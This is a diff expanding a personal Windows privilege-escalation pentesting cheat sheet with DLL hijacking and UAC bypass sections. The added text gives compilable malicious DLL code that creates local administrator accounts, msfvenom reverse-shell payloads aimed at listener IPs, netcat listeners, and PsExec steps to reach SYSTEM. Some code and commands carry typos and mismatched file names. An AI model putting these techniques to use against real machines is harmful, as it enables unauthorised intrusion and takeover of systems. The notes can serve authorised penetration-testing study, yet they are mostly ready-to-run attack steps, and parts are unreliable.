@@ -12,7 +12,7 @@ Basics:
 				LM Hash:DES Encryption
 	Windows Vault:(Credential Manager)	
 		stores credentials using which Windows log in the users automatically, which means that any Windows application that needs credentials to access a resource can make use of CWindows Vault and use the credentials supplied instead of users entering the username and password all the time.
-	UAC:(User Access Control)
+	UAC: see UAC Bypass sheet
 	PowerShell: See PowerShell For Pentesting
 	CommandPrompt: See CommandPrompt For Pentesting	
 	ACL:(Acess Control List)
@@ -382,22 +382,148 @@ Service Exploitation:
 				/f => dont prompt anything, do it quietly.
 			cmd> sc start regsvc ( restarting service)
 	DLL Hijacking:(Dynamic Link Library Hijacking)
+		In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly.
+		If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.
 		Basics:
-			Programs usually can't function by themselves, they have a lot of resources they need to hook into. If a program/service loads a dll using absolute path, then we can abuse that to pop a shell with the privileges the program runs with.
-			Generally, a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order.
-			if a dll file dont exists in c:\file.exe, then the checking order is:
-				directory of program
-				c:\windows\system32
-				c:\windows\system
-				c:\windows
-				current working directory
-				directroies in PATH env (system then user)
-			DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one.
-		Exploiation:
-			msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
-			transfer msf.dll and PowerSploit/CodeExecution/Invoke-DllInjection.ps1 to windows
-			start handler
-			cmd> powershell "invoke-DLLinjection.ps1 -ProcessID <pid> c:/----/msf.dll"
+			Its basically tricking a legitimate/trusted application into loading an arbitrary DLL.
+			Dll hijacking can be used:
+				1. to execute code
+				2. obtain persistence
+				3. privilege escaltion
+			Approaches for DLL HIjacking:
+				DLL replacement:
+					replace a legitimate DLL with an evil DLL.
+					This can be combined with DLL Proxying, which ensures all functionality of the original DLL remains intact.
+				DLL search order hijacking:
+					DLLs specified by an application without a path are searched for in fixed locations in a specific order.
+					Hijacking the search order takes place by putting the evil DLL in a location that is searched in before the actual DLL. This sometimes includes the working directory of the target application.
+				Phantom DLL hijacking:
+					drop an evil DLL in place of a missing/non-existing DLL that a legitimate application tries to load.
+				DLL redirection:
+					change the location in which the DLL is searched for, e.g. by editing the %PATH% environment variable, or .exe.manifest / .exe.local files to include the folder containing the evil DLL
+				WinSxS DLL replacement:(aka DLL side-loading)
+					replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL.
+				Relative path DLL Hijacking:
+					copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the evil DLL.
+		Finding dll to hijack:
+			Using Find-ProcessDLLHijack:(module of powersploit's powerup.ps1)
+				Find-ProcessDLLHijack => Finds all DLL hijack locations for currently running processes.
+				Find-ProcessDLLHijack -ExcludeOwned => Finds possible hijackable DLL location for processes not owned by the current user.
+				Get-Process VulnProcess | Find-ProcessDLLHijack => Finds possible hijackable DLL locations for the 'VulnProcess' processes.	
+			Using procmon:		
+				use filter "path ends with .dll && result is NAME NOT FOUND"
+				can be used on RDP
+		Finding a place to put evil.dll:
+			Factors to consider:
+				Dll Search Order => where is .dll going to be searched
+				Folder Permission => write permissions for the folder in which evil.dll is to be put
+			Dll Search Order:
+				Generally, a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order.	
+					directory of program
+					c:\windows\system32
+					c:\windows\system
+					c:\windows
+					current working directory
+					Directories in the system PATH environment variable
+					Directories in the user PATH environment variable
+						C:\>path => to see PATH variable
+				DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one.
+			Folder Permission:
+				accesschk.exe -dqv "C:\temp"
+				icacls "C:\temp"
+				Check permissions of all folders inside PATH:
+					Find-PathDLLHijack:(module of powersploit's powerup.ps1)
+						Finds all directories in the system %PATH% that are modifiable by the current user.
+					for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
+		creating evil.dll:
+			Automated:	
+				Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll' => this will add a malicious dll at 'C:\Temp\wlbsctrl.dll' which will  add a user to local administrators with a predefined password.
+					default => john:Password123!
+			msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o evil.dll
+			Manual dll:
+				manual dll-1:(Tested in Win10)
+					code:
+						#include <windows.h>
+						BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+						    switch(dwReason){
+						        case DLL_PROCESS_ATTACH:
+						            system("whoami > C:\\users\\username\\whoami.txt");
+						            WinExec("calc.exe", 0); //This doesn't accept redirections like system
+						            break;
+						        case DLL_PROCESS_DETACH:
+						            break;
+						        case DLL_THREAD_ATTACH:
+						            break;
+						        case DLL_THREAD_DETACH:
+						            break;
+						    }
+						    return TRUE;
+						}			
+					usage:
+						i686-w64-mingw32-g++ dll.c -lws2_32 -o evil.dll -shared
+				manual dll-2:
+					code:
+						#include <windows.h>
+						BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+						    if (dwReason == DLL_PROCESS_ATTACH){
+						        system("cmd.exe /k net localgroup administrators user /add");
+						        ExitProcess(0);
+						    }
+						    return TRUE;
+						}			
+					usage:
+						x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll => For x64
+						i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll => For x86
+				manual dll-3:
+					code:
+						#include <windows.h>
+
+						int owned()
+						{
+						  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
+						  exit(0);
+						  return 0;
+						}
+
+						BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+						{
+						  owned();
+						  return 0;
+						}			
+					usage:
+						x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
+						x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
+				manual dll-1:
+					code:
+						#include<windows.h>
+						#include<stdlib.h>
+						#include<stdio.h>
+
+						void Entry (){ //Default function that is executed when the DLL is loaded
+						    system("cmd");
+						}
+
+						BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+						    switch (ul_reason_for_call){
+						        case DLL_PROCESS_ATTACH:
+						            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
+						            break;
+						        case DLL_THREAD_ATTACH:
+						        case DLL_THREAD_DETACH:
+						        case DLL_PROCESS_DEATCH:
+						            break;
+						    }
+						    return TRUE;
+						}			
+					usage:
+						i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o evil.dll
+				Note:
+					the Dll that you compile must export several functions that are going to be loaded by the victim process, if these functions doesn't exist the binary won't be able to load them and the exploit will fail.
+		Once, evil.dll is created, transfer it to victim
+		if we have attacked a service:
+			Restart the service => explained above
+		if we have attacked an application:
+			wait for the application.exe to attempt to load evil.dll
 Registry Exploits:
 	Autorun Programs:
 		Discovery:
@@ -429,6 +555,114 @@ Registry Exploits:
 				C:\>msiexec /quiet /qn /i C:\temp\malicious.msi
 			Automated:
 				msfconsole => exploit/windows/local/always_install_elevated
+UAC Bypass:
+	Scenario:
+		The shell belongs to the local Administrators group but UAC is enabled and needs to be bypassed, before we can elevate to SYSTEM.
+	Basics:
+		Integrity Levels:
+			From Windows Vista, all protected objects are labeled with an integrity level
+			Note that a process with a lower integrity level can’t write to an object with a higher integrity level.
+			1. Untrusted:
+				processes that are logged on anonymously are automatically designated as Untrusted. Example: Chrome
+			2. Low:
+				The Low integrity level is the level used by default for interaction with the Internet. As long as Internet Explorer is run in its default state, Protected Mode, all files and processes associated with it are assigned the Low integrity level. a low integrity process is very restricted, it cannot write to the registry and it’s limited from writing to most locations in the current user’s profile.  Example: Internet Explorer or Microsoft Edge
+			3. Medium:
+				Medium is the context that most objects will run in. Standard users receive the Medium integrity level, and any object not explicitly designated with a lower or higher integrity level is Medium by default. Not that a user inside the Administrators group by default will use medium integrity levels.
+			4. High:
+				Administrators are granted the High integrity level. This ensures that Administrators are capable of interacting with and modifying objects assigned Medium or Low integrity levels, but can also act on other objects with a High integrity level, which standard users can not do. Example: "Run as Administrator"
+			5. System:
+				System integrity level is reserved for the system. The Windows kernel and core services are granted the System integrity level. Being even higher than the High integrity level of Administrators protects these core functions from being affected or compromised even by Administrators. Example: Services
+			6. Installer:
+				The Installer integrity level is a special case and is the highest of all integrity levels. By virtue of being equal to or higher than all other WIC integrity levels, objects assigned the Installer integrity level are also able to uninstall all other objects.
+			To know the integrity level of a user(shell):
+				whoami /groups
+		UAC:(User Access Control)
+			UAC is used to allow an administrator user to not give administrator privileges to each process executed. This is achieved using default the low privileged token of the user.
+			Running cmd.exe from the Start menu without select ‘Run as administrator’ will give a shell without admin privileges, For Example:
+				You cannot for example write to C:\Windows\System32 as it will give Access is denied error.
+			For tasks which require privilege elevation, the administrator SID is used after the prompt on Secure Desktop has been clicked away
+			Secure Desktop:
+				The Secure Desktop’s primary difference from the User Desktop is that only trusted processes running as SYSTEM are allowed to run here
+			UAC Settings:
+				1. Always Notify. This setting is the highest UAC setting. It will prompt the user when any program, including a built-in Windows program wants higher privileges.
+				2. Notify me only when programs try to make changes to my computer. This is the default UAC setting. This setting does not prompt the user when some built-in Windows program want higher privileges. It will prompt the user when any other program wants higher privileges. This distinction is important and it plays into the UAC bypass attack that we will cover in a moment.
+				3. Notify me only when programs try to make changes to my computer (do not dim my desktop). This is the same as the default setting, except the user’s desktop does not dim when the UAC elevation prompt comes up. This setting exists for computers that lack the computing power to dim the desktop and show a dialog on top of it.	
+				4. Never notify. This option takes us back to life before Windows Vista. On Windows 7, if a user is an administrator, all of their programs will run with high integrity. On Windows 8, programs run at the medium integrity level, but anything run by an Administrator that requests elevated rights gets them without a prompt.
+	Requirements:
+		whoami /groups
+			it should have "Mandatory Label\High Mandatory Level" group => we need to have moderate integrity shell
+	Checking UAC settings:
+		reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+			See value of 'EnableLUA' key:
+				0 => UAC is disabled
+				1 => UAC is enabled, then see these values:
+					ConsentPromptBehaviorAdmin:
+						0 => UAC won't prompt (like disabled)
+						1 => the admin is asked for username and password on secure desktop to execute the binary with high rights
+						2 => (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges
+						5 => (default) it will ask the administrator to confirm to run non Windows binaries with high privileges
+					PromptOnSecureDesktop:
+						Values => 0 or 1
+			Summary:
+				If EnableLUA=0 or doesn't exist => no UAC for anyone
+				If EnableLua=1 and LocalAccountTokenFilterPolicy=1 => No UAC for anyone
+				If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=0 => No UAC for RID 500 (Built-in Administrator)
+				If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=1 => UAC for everyone
+	Automated Method:
+		metasploit => exploit/windows/local/bypassuac_eventvwr
+	UACMe:(https://github.com/hfiref0x/UACME)
+		Its a compilation of several UAC bypass exploits.
+		akagi32 [Key] [Param] or akagi64 [Key] [Param
+			key => number of method to use
+				https://github.com/hfiref0x/UACME/blob/master/README.md
+			param:
+				Its optional
+				takes a command, example: executable file name including full path to run.
+				If empty => program will execute elevated cmd.exe
+	Manual Bypassing method-1:(https://github.com/turbo/zero2hero/)
+		Step-1 - Elevate cmd shell from Medium to High integrity:
+			Usage:
+				wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
+				edit main.c:
+					change line "strcat(curPath, "\\foobar.exe");" to "strcat(curPath, "\\revshell.exe");"
+			 	x86_64-w64-mingw32-gcc main.c -o eventvwr-bypassuac-64.exe
+			 	msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=3333 -f exe -o revshell.exe
+			 	transfer both revshell.exe and eventvwr-bypassuac-64.exe to target\
+			 	c:/>eventvwr-bypassuac-64.exe
+			 	nc -nvlp 3333 => got shell 
+			Explanation:
+				We got a High intergrity shell, means we unlocked more privileges which may or may not be enabled
+				whoami /priv
+		Step-2 - Elevate from High integrity cmd shell to SYSTEM:
+			Usage:
+				msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=4444 -f exe -o revshell2.exe
+				transfer psexec.exe and revshell2.exe to target
+				C:\>PsExec64.exe -i -accepteula -d -s C:\temp\revshell2.exe
+				nc -nvlp 4444 => got shell 
+			Explanation:
+				we got system shell
+		Note:
+			 At ‘Always notify’, in which case ConsentPromptBehaviorAdmin = 2 and PromptOnSecureDesktop = 1, this method will not work
+	Manual Bypassing method-2 using bypassuac.exe:
+		Step-1 - Elevate cmd shell from Medium to High integrity:	
+			In kali, we have:
+				bypassuac-x86.exe
+				bypassuac-x64.exe
+			transfer the exploit according to arch to the target
+			msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=1234 -f exe -o shell.exe
+			C:\>bypassuac-x64.exe /c C:\temp\shell.exe
+			nc -nvlp 1234 => got shell
+		Step-2 - Elevate from High integrity cmd shell to SYSTEM:
+			msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=2222 -f exe -o shell2.exe
+			transfer psexec.exe and shell2.exe on target
+			C:\>PsExec64.exe -i -accepteula -d -s C:\temp\shell.exe
+			nc -nvlp 2222 => got shell as system
+	Manual Bypassing method-3 by exploiting fodhelper.exe:
+		Fodhelper.exe was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It’s location is: C:\Windows\System32\fodhelper.exe and it is signed by Microsoft. The program is allowed to elevate itself to run in a high integrity context automatically. There is no need for any user interaction to allow the process to elevate.
+		https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
+	Bypassing UAC via DLL Hijacking:
+		Here, we find a process/application that has "autoelevate" and then do DLL Hijacking for that process
+	What is "Run as Administrator"
 Credentials mining:
 	Dumping Sam file:
 		dumping windows hashes using registery hives:
